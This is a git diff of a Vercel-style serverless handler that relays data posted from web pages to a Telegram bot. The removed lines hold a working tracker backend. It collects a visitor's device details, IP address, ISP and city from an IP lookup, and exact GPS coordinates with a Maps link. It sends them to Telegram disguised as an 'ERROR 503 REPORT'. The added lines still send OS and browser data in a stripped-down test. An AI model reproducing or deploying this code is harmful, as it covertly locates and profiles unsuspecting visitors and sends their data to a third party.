@@ -4,66 +4,33 @@ export const config = {
 
 export default async function handler(req, res) {
   if (req.method !== "POST") {
-    return res.status(405).json({ error: "Method Not Allowed" });
+    return res.status(405).send("Method Not Allowed");
   }
 
   const BOT_TOKEN = process.env.BOT_TOKEN;
   const CHAT_ID  = process.env.CHAT_ID;
 
   if (!BOT_TOKEN || !CHAT_ID) {
-    return res.status(500).json({ error: "ENV belum diset" });
+    return res.status(500).send("ENV MISSING");
   }
 
-  const input = req.body || {};
-
-  const ip =
-    req.headers["cf-connecting-ip"] ||
-    req.headers["x-forwarded-for"]?.split(",")[0] ||
-    "Unknown";
-
-  const time = new Date().toLocaleString("id-ID");
-
-  let ipinfo = {};
+  let input = {};
   try {
-    const r = await fetch(`https://ipapi.co/${ip}/json/`);
-    ipinfo = await r.json();
-  } catch {}
+    input = req.body;
+  } catch {
+    input = {};
+  }
 
-  // 🔒 AMAN: TANPA MARKDOWN
   const message = `
-ERROR 503 REPORT
+TEST BOT VERCEL
 
-DEVICE INFO
-OS: ${input.os || "-"}
-Platform: ${input.platform || "-"}
-CPU: ${input.cpu || "-"}
-RAM: ${input.ram || "-"}
-Resolution: ${input.resolution || "-"}
-Browser: ${input.browser || "-"}
-
-Timezone: ${input.timezone || "-"}
-Language: ${input.language || "-"}
-Public IP: ${ip}
-
-IP INFO
-Country: ${ipinfo.country_name || "-"}
-Region: ${ipinfo.region || "-"}
-City: ${ipinfo.city || "-"}
-ISP: ${ipinfo.org || "-"}
-
-LOCATION
-Lat: ${input.latitude || "-"}
-Lon: ${input.longitude || "-"}
-Accuracy: ${input.accuracy || "-"}
-
-Maps:
-https://www.google.com/maps?q=${input.latitude},${input.longitude}
-
-Time: ${time}
+OS: ${input?.os}
+Browser: ${input?.browser}
+Time: ${new Date().toLocaleString("id-ID")}
 `;
 
   try {
-    const tg = await fetch(
+    const r = await fetch(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
       {
         method: "POST",
@@ -75,17 +42,16 @@ Time: ${time}
       }
     );
 
-    const result = await tg.json();
+    const result = await r.json();
 
-    if (!result.ok) {
-      return res.status(500).json({
-        error: "Telegram reject",
-        detail: result
-      });
-    }
-
-    return res.status(200).json({ success: true });
+    return res.status(200).json({
+      ok: true,
+      telegram: result
+    });
   } catch (e) {
-    return res.status(500).json({ error: "Fetch gagal" });
+    return res.status(500).json({
+      error: "FETCH FAIL",
+      detail: e.toString()
+    });
   }
 }
